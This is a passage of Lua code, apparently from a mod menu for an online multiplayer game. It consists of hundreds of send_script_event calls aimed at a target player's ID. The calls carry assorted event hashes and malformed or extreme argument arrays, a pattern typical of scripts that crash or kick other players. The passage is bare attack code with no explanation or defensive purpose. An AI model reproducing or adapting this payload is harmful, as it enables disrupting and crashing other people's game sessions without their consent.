        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1160415507, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3317451851, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(
            -1975590661,
            pid,
            {84857178, 61749268, -80053711, -78045655, 56341553, -78686524, -46044922, -22412109, 29388428, -56335450}
        )
        send_script_event(
            -922075519,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(-452918768, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-966559987, pid, {pid, 532165, pid})
        send_script_event(733106126, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-442306200, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(1881968783, pid, {pid, 532165, pid})
        send_script_event(-1729804184, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(2099816323, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        send_script_event(-1256990787, pid, {pid, 532165, pid})
        send_script_event(121406262, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165})
        send_script_event(1070934291, pid, {pid, -1, -1, -1, -1})
        send_script_event(435067392, pid, {pid, 532165, pid})
        send_script_event(171207973, pid, {pid, 532165, pid})
        send_script_event(1212832151, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1054826273, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1491386500, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(720040631, pid, {pid, 532165, pid})
        send_script_event(1559754940, pid, {pid, 532165, pid})
        send_script_event(87967637, pid, {pid, 532165, pid})
        send_script_event(61749268, pid, {pid, 532165, pid})
        send_script_event(80053711, pid, {pid, 532165, pid})
        send_script_event(78045655, pid, {pid, 532165, pid})
        send_script_event(56341553, pid, {pid, 532165, pid})
        send_script_event(78686524, pid, {pid, 532165, pid})
        send_script_event(46044922, pid, {pid, 532165, pid})
        send_script_event(22412109, pid, {pid, 532165, pid})
        send_script_event(29388428, pid, {pid, 532165, pid})
        send_script_event(56335450, pid, {pid, 532165, pid})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-171207973, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-171207973, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-171207973, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-171207973, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-171207973, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-171207973, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-171207973, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-171207973, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-171207973, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -171207973,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -171207973,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -171207973,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(
            -1212832151,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1212832151, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(-1212832151, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(-1252906024, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1252906024, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165})
        send_script_event(922075519, pid, {pid, 532165, pid})
        send_script_event(1975590661, pid, {pid, 532165, pid})
        send_script_event(1882923979, pid, {pid, 532165, pid})
        send_script_event(1139568479, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(0xC5BC4C4B, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x2DC0B959, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8BD47182, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1139568479, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8179EBCE, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xC90A3E81, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0x8A3EE0FB, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(767605081, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(2122716210, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(977515445, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(767605081, pid, {pid, 532165, pid})
        send_script_event(-1730227041, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(526625102, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1347850743, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-799924696, pid, {pid, 532165, pid})
        util.yield(1)
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(2646045593, pid, {-1, 0, -1, 0})
        send_script_event(1347850743, pid, {-1, 0, -1, 0})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3859899904, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-81613951, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1292453789, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1623637790, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1905128202, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1160415507, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(3317451851, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(
            -1975590661,
            pid,
            {84857178, 61749268, -80053711, -78045655, 56341553, -78686524, -46044922, -22412109, 29388428, -56335450}
        )
        send_script_event(
            -922075519,
            pid,
            {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}
        )
        send_script_event(-452918768, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165, pid})
        send_script_event(-1890951223, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-966559987, pid, {pid, 532165, pid})
        send_script_event(733106126, pid, {pid, 532165, pid})
        send_script_event(-435067392, pid, {pid, 532165, pid})
        send_script_event(-442306200, pid, {pid, 532165, pid})
        send_script_event(-1559754940, pid, {pid, 532165, pid})
        send_script_event(1881968783, pid, {pid, 532165, pid})
        send_script_event(-1729804184, pid, {pid, 532165, pid})
        send_script_event(-977515445, pid, {pid, 532165, pid})
        send_script_event(-1491386500, pid, {pid, 532165, pid})
        send_script_event(2099816323, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(-1054826273, pid, {pid, 532165, pid})
        send_script_event(-1256990787, pid, {pid, 532165, pid})
        send_script_event(121406262, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165})
        send_script_event(1070934291, pid, {pid, -1, -1, -1, -1})
        send_script_event(435067392, pid, {pid, 532165, pid})
        send_script_event(171207973, pid, {pid, 532165, pid})
        send_script_event(1212832151, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1054826273, pid, {pid, 532165, pid})
        send_script_event(1620254541, pid, {pid, 532165, pid})
        send_script_event(1401831542, pid, {pid, 532165, pid})
        send_script_event(1491386500, pid, {pid, 532165, pid})
        send_script_event(1070934291, pid, {pid, 532165, pid})
        send_script_event(1949011582, pid, {pid, 532165, pid})
        send_script_event(720040631, pid, {pid, 532165, pid})
        send_script_event(1559754940, pid, {pid, 532165, pid})
        send_script_event(87967637, pid, {pid, 532165, pid})
        send_script_event(61749268, pid, {pid, 532165, pid})
        send_script_event(80053711, pid, {pid, 532165, pid})
        send_script_event(78045655, pid, {pid, 532165, pid})
        send_script_event(56341553, pid, {pid, 532165, pid})
        send_script_event(78686524, pid, {pid, 532165, pid})
        send_script_event(46044922, pid, {pid, 532165, pid})
        send_script_event(22412109, pid, {pid, 532165, pid})
        send_script_event(29388428, pid, {pid, 532165, pid})
        send_script_event(56335450, pid, {pid, 532165, pid})
        send_script_event(0xE6116600, pid, {0, 0, 46190868, 0, 2, -2120750352})
        send_script_event(0xE6116600, pid, {46190868, 0, 46190868, 46190868, 2, -2120750352})
        send_script_event(0xE6116600, pid, {1337, -1, 1, 1, 0, 0, 0, -2120750352})
        send_script_event(0xE6116600, pid, {pid, 1337, -1, 1, 1, 0, 0, 0, -2120750352})
        send_script_event(-1729804184, pid, {pid, 532165, pid})
        send_script_event(1428412924, pid, {pid, 532165})
        send_script_event(823645419, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1070934291,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-442306200, pid, {-1, 0})
        send_script_event(
            -1949011582,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1949011582, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(154008137, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            154008137,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(154008137, pid, {-1, 0})
        send_script_event(428882541, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            428882541,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(428882541, pid, {-1, 0})
        send_script_event(-1714354434, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1714354434,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1714354434, pid, {-1, 0})
        send_script_event(-435067392, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xF5CB92DB, pid, {0, 0, 46190868, 0, 2})
        send_script_event(0xF5CB92DB, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(0xF5CB92DB, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xF5CB92DB, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(0xc5bc4c4b, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-2120750352, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(0xE6116600, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-977515445, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(767605081, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1949011582, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -2122716210,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -922075519,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1975590661,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(
            -171207973,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-171207973, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(-171207973, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -171207973,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-171207973, pid, {-1, 0})
        send_script_event(-171207973, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-171207973, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165, pid})
        send_script_event(-171207973, pid, {pid, 532165})
        send_script_event(-171207973, pid, {1, 0})
        send_script_event(-171207973, pid, {0, -1})
        send_script_event(-1212832151, pid, {-1, 0})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165, pid})
        send_script_event(-1212832151, pid, {pid, 532165})
        send_script_event(-1212832151, pid, {1, 0})
        send_script_event(-1212832151, pid, {0, -1})
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            -1212832151,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(-1212832151, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(-1212832151, pid, {0, 0, 46190868, 0, 2})
        send_script_event(-1212832151, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(-1212832151, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1212832151, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(-1212832151, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(-1212832151, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(-1212832151, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1212832151, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(-1212832151, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            -1212832151,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            -1212832151,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            -1212832151,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(
            1317868303,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(1317868303, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(1317868303, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(1317868303, pid, {-1, 0})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {pid, -13, -12, -11, -10, 19, pid, 10, 10, 10, 10, -1, -11, -19, -506, 506})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165, pid})
        send_script_event(1317868303, pid, {pid, 532165})
        send_script_event(1317868303, pid, {1, 0})
        send_script_event(1317868303, pid, {0, -1})
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(
            1317868303,
            pid,
            {
                pid,
                -10000000,
                -10000000,
                -1000000,
                -10000000000,
                -100000,
                -1000000000,
                -10000,
                -10,
                -100,
                -1,
                -10000000000000,
                -10000000,
                -10000000,
                -1000000,
                -1000000,
                -100000,
                -1000000,
                -10,
                -10,
                pid,
                -10,
                pid
            }
        )
        send_script_event(1317868303, pid, {pid, 23048976 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {pid, 23048976 + 1 + pid * 695 + 507})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 989 + 555})
        send_script_event(1317868303, pid, {0, 0, 46190868, 0, 2})
        send_script_event(1317868303, pid, {46190868, 0, 46190868, 46190868, 2})
        send_script_event(1317868303, pid, {1337, -1, 1, 1, 0, 0, 0})
        send_script_event(1317868303, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
        send_script_event(1317868303, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
        send_script_event(1317868303, pid, {91645, -99683, 1788, 60877, 55085, 72028})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {pid, 1630317 + 1 + pid * 595 + 506})
        send_script_event(1317868303, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1317868303, pid, {-1, 500000, 849451549, -1, -1})
        send_script_event(1317868303, pid, {-1139568479, -1, 1, 100099})
        send_script_event(
            1317868303,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(
            1317868303,
            pid,
            {
                -1,
                -1,
                -1,
                -1,
                -1139568479,
                -1,
                1,
                100099,
                -1,
                500000,
                849451549,
                -1,
                -1,
                91645,
                -99683,
                1788,
                60877,
                55085,
                72028
            }
        )
        send_script_event(
            1317868303,
            pid,
            {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028}
        )
        send_script_event(-1252906024, pid, {pid, 532165, pid})
        send_script_event(-1252906024, pid, {pid, 532165})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10
            }
        )
        send_script_event(-1252906024, pid, {-1, 0})
        send_script_event(
            -1252906024,
            pid,
            {pid, -1726396442, 428882541, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10}
        )
        send_script_event(-1252906024, pid, {pid, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
        send_script_event(-1252906024, pid, {pid, -1, -1, -1, -1})
        send_script_event(
            -1252906024,
            pid,
            {
                pid,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
                -10,
